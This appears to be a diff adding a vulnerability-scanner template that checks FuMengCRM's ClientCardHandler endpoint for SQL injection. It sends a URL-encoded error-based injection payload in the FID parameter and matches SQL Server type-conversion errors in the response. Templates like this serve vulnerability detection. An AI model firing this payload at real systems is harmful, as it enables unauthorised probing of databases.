@@ -1,0 +1,27 @@
+id: FuMengCRM-ClientCardHandler-sqlInjection
+
+info:
+  name: FuMengCRM-ClientCardHandler-sqlInjection
+  author: iSee857
+  severity: high
+  description: |
+    FuMengCRM-ClientCardHandler-sqlInjection
+
+http:
+  - raw:
+      - |
+        GET /m/Dingding/Ajax/ClientCardHandler.ashx?method=getCardImage&FID=%31%27%61%6e%64%20%31%3c%40%40%76%65%72%73%69%6f%6e%2d%2d HTTP/1.1
+        Host: {{host}}
+
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        part: body
+        words:
+          - "nvarchar"
+          - "数据类型"
+          - "false"
+        condition: and
